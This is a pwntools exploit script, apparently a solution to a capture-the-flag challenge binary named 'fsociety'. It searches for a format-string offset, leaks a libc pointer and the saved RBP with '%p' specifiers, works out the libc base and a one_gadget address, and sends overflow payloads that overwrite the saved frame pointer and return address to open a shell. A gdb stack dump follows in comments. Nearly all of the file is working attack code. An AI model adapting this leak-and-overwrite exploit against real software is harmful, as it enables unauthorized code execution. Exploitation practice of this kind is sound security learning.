from pwn import *

binary = ELF("./fsociety")

def offset_finder():
    for x in range (1, 100):
        p = process("./fsociety")

        print "Offset number {}".format(x)

        payload = ""
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("Welcome to Fsociety young blood, ")
        stack_value = p.recvline()[:-1]
        if stack_value.find("b97") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    p = process("./fsociety")

    gdb.attach(p, '''
                    b *inputScan+68
                    b *revolution+128
                    c
                ''')

    p.sendline("%87$p-%89$p")
    p.recvuntil("Welcome to Fsociety young blood, ")
    stack_value = p.recvline().split('-')

    libc_leak = stack_value[0]
    saved_rbp = stack_value[1]
    # libc_leak = p.recvline()[:-1]

    saved_rbp = int(saved_rbp, 16) - 0xe8 - 0x18 - 0x8
    libc_leak = int(libc_leak, 16)
    log.info("Saved RBP : {}".format(hex(saved_rbp)))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x21b97
    log.info("Libc base : {}".format(hex(libc_base)))
    one_gadget = libc_base + 0x4f2c5
    log.info("One gadget addr : {}".format(hex(one_gadget)))
    
    p.sendline('A' * 32 + '\xf0')

    p.sendline('A' * 32 + p64(saved_rbp) + p64(one_gadget))

    p.interactive()

if __name__ == "__main__":
    exploit()

# 0x7fffffffdba8: 0x0000000000401295      0x00007fffffffdca8
# 0x7fffffffdbb8: 0x0000000100000000      0x00000000004012b0
# 0x7fffffffdbc8: 0x00007ffff7a05b97      0x0000000000000001
# 0x7fffffffdbd8: 0x00007fffffffdca8      0x0000000100008000
# 0x7fffffffdbe8: 0x000000000040125e      0x0000000000000000
# 0x7fffffffdbf8: 0x74408ab9e1f33df8      0x0000000000401090
# 0x7fffffffdc08: 0x00007fffffffdca0      0x0000000000000000
# 0x7fffffffdc18: 0x0000000000000000      0x8bbf75c673333df8
# 0x7fffffffdc28: 0x8bbf6579720d3df8      0x00007fff00000000
# 0x7fffffffdc38: 0x0000000000000000      0x0000000000000000
# 0x7fffffffdc48: 0x00007ffff7de5733      0x00007ffff7dcb638
# 0x7fffffffdc58: 0x000000001c30098e      0x0000000000000000
# 0x7fffffffdc68: 0x0000000000000000      0x0000000000000000
# 0x7fffffffdc78: 0x0000000000401090      0x00007fffffffdca0
# 0x7fffffffdc88: 0x00000000004010ba      0x00007fffffffdc98
# 0x7fffffffdc98: 0x000000000000001c      0x0000000000000001
# 0x7fffffffdca8: 0x00007fffffffe055      0x0000000000000000
# 0x7fffffffdcb8: 0x00007fffffffe09e      0x00007fffffffe0ad
# 0x7fffffffdcc8: 0x00007fffffffe0c1      0x00007fffffffe123
# 0x7fffffffdcd8: 0x00007fffffffe156      0x00007fffffffe16d
# 0x7fffffffdce8: 0x00007fffffffe178      0x00007fffffffe1ac
# 0x7fffffffdcf8: 0x00007fffffffe1c5      0x00007fffffffe1d5
# 0x7fffffffdd08: 0x00007fffffffe1eb      0x00007fffffffe200
# 0x7fffffffdd18: 0x00007fffffffe216      0x00007fffffffe232
# 0x7fffffffdd28: 0x00007fffffffe253      0x00007fffffffe272
# 0x7fffffffdd38: 0x00007fffffffe288      0x00007fffffffe299
# 0x7fffffffdd48: 0x00007fffffffe2a3      0x00007fffffffe2ba
# 0x7fffffffdd58: 0x00007fffffffe2d8      0x00007fffffffe2f3
# 0x7fffffffdd68: 0x00007fffffffe30b      0x00007fffffffe31f
# 0x7fffffffdd78: 0x00007fffffffe336      0x00007fffffffe34b